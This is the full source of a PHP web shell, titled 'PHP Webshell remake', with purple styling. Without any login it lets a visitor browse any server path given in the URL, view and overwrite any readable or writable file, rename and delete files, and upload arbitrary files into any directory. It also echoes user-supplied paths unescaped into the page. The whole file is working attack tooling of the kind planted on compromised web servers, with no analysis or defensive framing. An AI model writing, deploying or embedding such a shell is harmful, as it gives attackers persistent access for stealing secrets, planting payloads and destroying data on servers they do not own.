<?php

session_start();
if(!isset($_GET['path'])){
    $path = __DIR__;
}
if(isset($_GET['path'])){
    $path = $_GET['path'];
}

?>

<html>
    <head>
        <title>PHP Webshell remake</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
        <link rel="icon" type="image/png" href="https://cdn.clipart.email/5e916fb0e7b328f9345ba0c6f8382f75_lean-purple-purplecup-codein-cup-freetoedit_240-400.png"/>
    </head>
    <style>
        body{
            font-family:Orbitron;
            text-align:center;
            background-color:#000;
            color:#fff;
            text-shadow: 1px 2px 1px purple;
        }
        .main{
            text-align:center;
        }
        .title{

        }
        .table{
            text-align:center;
        }
        table{
        }
        td {
            border: none;
        }
        th {
            border: none;
        }
        th, td {
            padding-left: 30px; 
            padding-top:10px;
            background-color:none;
        }
        a:link {
            color: inherit;
            text-decoration: none;
        }
        a:visited {
            color: inherit;
            text-decoration: none;
        }
        a:hover {
            color: inherit;
            text-decoration: none;
        }
        a:active {
            color: inherit;
            text-decoration: none;
        }
        input[name="path"] {
            color:white;
            font-family:Orbitron;
            outline: none;
            background-color: #22232a;
            -webkit-border-radius: 45px;
            -moz-border-radius: 45px;
            border-color:purple;
            border-radius: 45px;
            font-size: 15px;
            height: 45px;
            width:500px;
            border: 2px solid;
            padding-left: 15px;
        }
        input[type="submit"]{
	        width: 112px;
	        height: 37px;
	        -moz-border-radius: 19px;
	        -webkit-border-radius: 19px;
	        border-radius: 19px;
	        background-color: #b11fd1;
	        border:2px solid white;
	        color: white;
	        font-weight: bold;
        }
        tr > th{
            padding: 10px 50px;
            background: rgba(255,255,255,0.2);
            color: #fff;
            font-size: 18px;
            font-weight: 500;
        }
        tr > td{
            padding: 12px 50px;
            color: #fff;
            font-weight: 400;
        }   
        tr:first-child{
        background: #b11fd1;
        }
    </style>
    <body>
        <div class="main">
            <h1>Webshell remake</h1>
            <form action="" method="GET">
                <input type="text" name="path" value="<?php if(isset($_GET['path'])){ echo $_GET['path']; } if(!isset($_GET['path'])){ echo __DIR__; } ?>" />
            </form>
            <form action="" method="POST">
                <input type="submit" name="submit" value="Submit">
            </form>
            </br></br>
            <form action="" method="POST" enctype='multipart/form-data'>
                <input type="file" name="file">
                <input type="submit" name="submitfile" value="Upload">
            </form>
            </br></br>
                <?php
                    if(!isset($_GET['option']) OR empty($_GET['option'])){
                        if(is_file($path)){
                            $fcontent = htmlspecialchars(file_get_contents($path));
                            echo "<pre>" . $fcontent . "</pre>";
                        die;
                        }
                    }
                    if(isset($_GET['option'])){
                        if(is_file($path)){
                            $info = pathinfo($path);
                            if(is_file($info['basename'])){
                            }
                            if($_GET['option'] == "edit"){

                                $fcontent = htmlspecialchars(file_get_contents($path));

                                if(isset($_POST['edit'])){
                                    if(is_writable($path)){

                                        $input = $_POST['editinput'];

                                        $f = fopen($path, "w");
                                        fwrite($f, $input);
                                        fclose($f);

                                        header('refresh: 0');
                                        echo "<script>alert('File Edited Successfuly');</script>";

                                    } elseif(!is_writable($path)) {
                                        die("<p color='#ff0000'>Failed to Edit File</p>");
                                    }

                                }

                                echo "<form method='POST'>";
                                echo "<textarea name='editinput' style='resize:none;width:500px;height:350px;'>" . $fcontent . "</textarea></br></br>";
                                echo "<input type='submit' name='edit' value='Edit'/>";
                                echo "</form>";

                                die;
                                
                            }
                            if($_GET['option'] == "rename"){
                                if(isset($_POST['renameSubmit'])){

                                    $input = $_POST['rename'];

                                    rename($path, $input);

                                    header('location: ./');
                                    
                                }

                                echo "<form method='POST'>";
                                echo "<input type='text' name='rename' value='" . $info['basename'] . "'></br></br>";
                                echo "<input type='submit' name='renameSubmit' value='Rename'/>";
                                echo "</form>";
                            
                                die;
                            }
                            if($_GET['option'] == "remove"){
                                unlink($path);

                                header("location: ./");
                                die;
                            }
                        }
                    }
                    function perms($file){
                        $perms = fileperms($file);
                         
                        if (($perms & 0xC000) == 0xC000) {
                        // Socket
                        $info = 's';
                        } elseif (($perms & 0xA000) == 0xA000) {
                        // Symbolic Link
                        $info = 'l';
                        } elseif (($perms & 0x8000) == 0x8000) {
                        // Regular
                        $info = '-';
                        } elseif (($perms & 0x6000) == 0x6000) {
                        // Block special
                        $info = 'b';
                        } elseif (($perms & 0x4000) == 0x4000) {
                        // Directory
                        $info = 'd';
                        } elseif (($perms & 0x2000) == 0x2000) {
                        // Character special
                        $info = 'c';
                        } elseif (($perms & 0x1000) == 0x1000) {
                        // FIFO pipe
                        $info = 'p';
                        } else {
                        // Unknown
                        $info = 'u';
                        }
                         
                        // Owner
                        $info .= (($perms & 0x0100) ? 'r' : '-');
                        $info .= (($perms & 0x0080) ? 'w' : '-');
                        $info .= (($perms & 0x0040) ?
                        (($perms & 0x0800) ? 's' : 'x' ) :
                        (($perms & 0x0800) ? 'S' : '-'));
                         
                        // Group
                        $info .= (($perms & 0x0020) ? 'r' : '-');
                        $info .= (($perms & 0x0010) ? 'w' : '-');
                        $info .= (($perms & 0x0008) ?
                        (($perms & 0x0400) ? 's' : 'x' ) :
                        (($perms & 0x0400) ? 'S' : '-'));
                         
                        // World
                        $info .= (($perms & 0x0004) ? 'r' : '-');
                        $info .= (($perms & 0x0002) ? 'w' : '-');
                        $info .= (($perms & 0x0001) ?
                        (($perms & 0x0200) ? 't' : 'x' ) :
                        (($perms & 0x0200) ? 'T' : '-'));
                         
                        return $info;
                        }

                    $scan = scandir($path);

                    echo '<table class="table" align="center">';
                    echo "<th>Name</th>";
                    echo "<th>Last Modif</th>";
                    echo "<th>Permission</th>";
                    echo "<th>Action</th>";

                    foreach($scan as $dir){
                        if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;

                            echo "<tr>";
                            echo "<td>" . $dir . "</td>";
                            echo "<td>[+]</td>";
                            echo "<td>" . perms($path.'/'.$dir) . "</td>";
                            echo "<td>" . "</td>";
                            echo "</tr>";
                    }
                    foreach($scan as $file){
                        if(!is_file($path.'/'.$file)) continue;

                            $size = filesize($path . '/' . $file)/1024;
                            $size = round($size, 3);
                            if($size >= 1024){
                                $size = round($size / 1024,2) . ' MB';
                            }else{
                                $size = $size . ' KB';
                            }
                            echo "<tr>";
                            echo "<td>" . $file . "</td>";
                            echo "<td>" . $size . "</td>";
                            echo "<td>" . perms($path.'/'.$file) . "</td>";
                            echo "<td>" . "<a href='" . $_SERVER['PHP_SELF'] . "?path=" . $path . '/' . $file . "'>See File</a>" . " / " . "<a href='" . $_SERVER['PHP_SELF'] . "?path=" . $path . '/' . $file . "&option=edit" . "'>Edit</a>" . " / " . "<a href='" . $_SERVER['PHP_SELF'] . "?path=" . $path . "/" . $file . "&option=rename" . "'>Rename</a>" . " / " . "<a href='" . $_SERVER['PHP_SELF'] . "?path=" . $path . '/' . $file . "&option=remove" . "'>Remove</a>" . "</td>";
                            echo "</tr>";
                            
                        }

                    if(isset($_POST['submitfile'])){

                        $filename = $_FILES['file']['name'];

                        move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $filename);
                    }
                ?>
            </table>
        </div>
    </body>
</html>

